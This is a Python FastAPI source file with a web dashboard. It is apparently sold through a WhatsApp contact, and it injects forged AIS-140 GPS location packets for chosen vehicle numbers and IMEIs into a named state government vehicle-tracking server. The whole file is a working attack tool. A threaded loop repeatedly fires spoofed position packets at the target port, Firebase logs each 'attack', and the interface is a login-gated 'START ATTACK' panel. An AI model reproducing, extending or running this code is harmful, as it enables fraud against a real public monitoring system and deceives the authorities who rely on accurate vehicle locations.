import threading
import time
import socket
import httpx
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
from fastapi import FastAPI, BackgroundTasks, Request
from fastapi.responses import HTMLResponse

app = FastAPI()

# --- 1. CONFIGURATION ---
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]
DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"
TARGET_DOMAIN = "vlts.bihar.gov.in"
TARGET_PORT = 9999

stop_event = threading.Event()
stop_event.set()
packet_count = 0
executor = ThreadPoolExecutor(max_workers=25)

# --- 2. ENGINE LOGIC ---
def sync_to_firebase(vno, data):
    try:
        with httpx.Client() as client:
            client.patch(f"{DB_URL}/Data_Records/{vno.upper()}.json", json=data)
    except: pass

def handshake_worker(tag, imei, vno, lat, lon):
    global packet_count
    try:
        now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
        date_str = now.strftime('%d%m%Y')
        time_str = now.strftime('%H%M%S')
        packet = f"$PVT,{tag},1.ONTC,NR,01,L,{imei},{vno},1,{date_str},{time_str},{lat},N,{lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*\r\n"
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            s.connect((TARGET_DOMAIN, TARGET_PORT))
            s.sendall(packet.encode())
            packet_count += 1
    except: pass

def nitro_firing_loop(v_up, i, lt, ln, t_up):
    target_tags = TAGS if t_up == "AUTO" else [t_up]
    while not stop_event.is_set():
        for tag in target_tags:
            if stop_event.is_set(): break
            executor.submit(handshake_worker, tag, i, v_up, lt, ln)
        time.sleep(0.05)

# --- 3. API ROUTES ---
@app.get("/init")
async def init(v:str, i:str, lt:str, ln:str, t:str, background_tasks: BackgroundTasks):
    global packet_count
    if stop_event.is_set():
        v_up, t_up = v.upper().strip(), t.upper().strip()
        packet_count = 0
        stop_event.clear()
        now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
        payload = {"Vehicle_No": v_up, "IMEI_No": i, "Lat": lt, "Lon": ln, "Last_Attack": now.strftime('%Y-%m-%d %H:%M:%S')}
        background_tasks.add_task(sync_to_firebase, v_up, payload)
        threading.Thread(target=nitro_firing_loop, args=(v_up, i, lt, ln, t_up), daemon=True).start()
    return {"ok": True}

@app.get("/status")
def status(): return {"c": packet_count, "f": not stop_event.is_set()}

@app.get("/stop")
def stop(): stop_event.set(); return {"ok": True}

@app.get("/fetch_data")
async def fetch_api(vno: str):
    async with httpx.AsyncClient() as client:
        res = await client.get(f"{DB_URL}/Data_Records/{vno.upper()}.json")
        data = res.json()
        if data: return {"found": True, "imei": data.get('IMEI_No'), "lat": data.get('Lat'), "lon": data.get('Lon')}
    return {"found": False}

# --- 4. NEON UI (WITH WHATSAPP REDIRECT) ---
@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NITRO V82 PRO | LOGIN</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        * { box-sizing: border-box; }
        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; }
        .login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
        .login-box { width: 100%; max-width: 350px; border: 2px solid #0f0; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px #0f0; text-align: center; }
        .header { width: 100%; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; background: #111; border-bottom: 1px solid #0f0; font-size: 12px; }
        .dashboard { width:95%; max-width:440px; border:2px solid #0f0; padding:15px; background:rgba(0,10,0,0.95); border-radius:15px; box-shadow: 0 0 25px #0f0; margin-top:10px; text-align:center; }
        .admin-msg { background: yellow; color: black; font-weight: bold; padding: 5px; width: 100%; font-size: 11px; margin-bottom: 5px; }
        input, select { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; margin-top:10px; outline:none; text-transform:uppercase; font-size:16px; border-radius:5px; }
        button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; border-radius:5px; }
        #map { width:100%; height:180px; margin-top:10px; border:1px solid #0f0; border-radius:10px; }
        .whatsapp-btn { margin-top: 20px; color: #25D366; cursor: pointer; text-decoration: underline; font-size: 14px; font-weight: bold; }
    </style></head><body>

    <div id="loginPage" class="login-overlay">
        <div class="login-box">
            <h2 style="color:#0f0; letter-spacing:3px;">SYSTEM LOGIN</h2>
            <input type="text" id="l_mob" placeholder="MOBILE NUMBER">
            <input type="password" id="l_pass" placeholder="PASSWORD">
            <div style="display:flex; justify-content:space-between; margin-top:15px; font-size:12px; color:#fff;">
                <label><input type="checkbox" id="remMe"> Remember Me</label>
            </div>
            <button onclick="doLogin()" style="background:#0f0; color:#000; margin-top:20px;">ACCESS SYSTEM</button>
            <div class="whatsapp-btn" onclick="window.open('https://wa.me/917464010787?text=Hello%20Admin,%20I%20need%20access.')">CONTACT US ON WHATSAPP</div>
        </div>
    </div>

    <div id="mainUI" style="display:none; width:100%;">
        <div class="header"><span>USER: <b id="u_name">---</b></span><span style="color:#f00; cursor:pointer;" onclick="logout()">LOGOUT</span></div>
        <div id="adminMsg" class="admin-msg">SYSTEM READY</div>
        <div class="dashboard">
            <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
            <input type="text" id="i" placeholder="IMEI">
            <div style="display:flex;gap:5px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
            <select id="tagSel"><option value="AUTO">AUTO (AIS-140)</option>""" + "".join([f'<option value="{t}">{t}</option>' for t in TAGS]) + """</select>
            <button onclick="st()" id="startBtn" style="background:#0f0;color:#000;font-size:18px;">START ATTACK</button>
            <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
            <div id="map"></div>
            <div style="display:flex;justify-content:space-between;margin-top:10px;font-size:12px;"><span>SENT: <b id="c">0</b></span><span id="st_text" style="color:lime">IDLE</span></div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        let map, marker, currentUser = null;
        const DB = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com";

        window.onload = () => {
            let saved = localStorage.getItem('nitro_creds');
            if(saved) {
                let d = JSON.parse(saved);
                document.getElementById('l_mob').value = d.m;
                document.getElementById('l_pass').value = d.p;
                document.getElementById('remMe').checked = true;
                doLogin();
            }
        };

        function doLogin() {
            let m = document.getElementById('l_mob').value.trim();
            let p = document.getElementById('l_pass').value.trim();
            if(!m || !p) return;
            fetch(`${DB}/users/${m}.json`).then(r=>r.json()).then(u=>{
                if(u && u.password == p) {
                    if(document.getElementById('remMe').checked) localStorage.setItem('nitro_creds', JSON.stringify({m,p}));
                    currentUser = m;
                    document.getElementById('u_name').innerText = u.name;
                    document.getElementById('loginPage').style.display = 'none';
                    document.getElementById('mainUI').style.display = 'block';
                    initMap(); startSync();
                } else { alert("ACCESS DENIED!"); }
            });
        }

        function logout() { localStorage.removeItem('nitro_creds'); location.reload(); }
        function initMap() { map = L.map('map').setView([25.63, 84.78], 13); L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png').addTo(map); marker = L.marker([25.63, 84.78]).addTo(map); }
        function startSync() {
            setInterval(() => {
                fetch('/status').then(r=>r.json()).then(d=> {
                    document.getElementById('c').innerText = d.c;
                    document.getElementById('st_text').innerText = d.f ? 'FIRING' : 'IDLE';
                    document.getElementById('st_text').style.color = d.f ? 'red' : 'lime';
                });
            }, 2000);
        }

        async function smartFetch() {
            let v = document.getElementById('v').value.toUpperCase(); if(!v) return;
            let res = await fetch(`/fetch_data?vno=${v}`); let d = await res.json();
            if(d.found){
                document.getElementById('i').value = d.imei;
                document.getElementById('lt').value = d.lat; document.getElementById('ln').value = d.lon;
                map.setView([d.lat, d.lon], 15); marker.setLatLng([d.lat, d.lon]);
            }
        }
        function st() { let v=document.getElementById('v').value, i=document.getElementById('i').value, lt=document.getElementById('lt').value, ln=document.getElementById('ln').value, t=document.getElementById('tagSel').value; fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}&t=${t}`); }
        function sp() { fetch('/stop'); }
    </script></body></html>
    """
